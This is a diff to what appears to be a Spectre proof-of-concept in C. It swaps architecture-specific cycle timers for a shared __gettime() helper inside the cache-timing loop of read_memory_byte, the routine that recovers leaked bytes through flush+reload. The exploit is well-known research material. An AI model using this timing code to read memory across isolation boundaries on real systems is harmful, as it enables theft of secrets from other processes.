@@ -5,18 +5,13 @@
 
 #include "spectre_archs.h"
 #include "spectre_intrinsics.h"
+#include "timer.h"
 
 #if defined(__ARCH_POWERPC__)
 #define CACHE_HIT_THRESHOLD 1
 #else
 #define CACHE_HIT_THRESHOLD 80
 #endif
-
-long __posix_time(void) {
-	struct timespec tp;
-	clock_gettime(CLOCK_MONOTONIC, &tp);
-	return tp.tv_nsec;
-}
 
 /********************************************************************
  * Victim code.
@@ -93,24 +88,12 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			mix_i = (((i * 167) + 13) & 255);
 			addr = &array2[mix_i * 512];
 
-#if defined(__ARCH_POWERPC__)
-			time1 = (uint64_t)__mftb() | ((uint64_t)__mftbu() << 32);
-#elif defined(__ARCH_X86__)
-			time1 = __rdtscp(&junk); /* READ TIMER */
-#else
-			time1 = __posix_time();
-#endif
+			time1 = __gettime();
 
 			junk = *addr; /* MEMORY ACCESS TO TIME */
 
 			/* READ TIMER & COMPUTE ELAPSED TIME */
-#if defined(__ARCH_POWERPC__)
-			time2 = (uint64_t)__mftb() | ((uint64_t)__mftbu() << 32);
-#elif defined(__ARCH__X86__)
-			time2 = __rdtscp(&junk);
-#else
-			time2 = __posix_time();
-#endif
+			time2 = __gettime();
 			time2 -= time1;
 
 			if (time2 <= CACHE_HIT_THRESHOLD
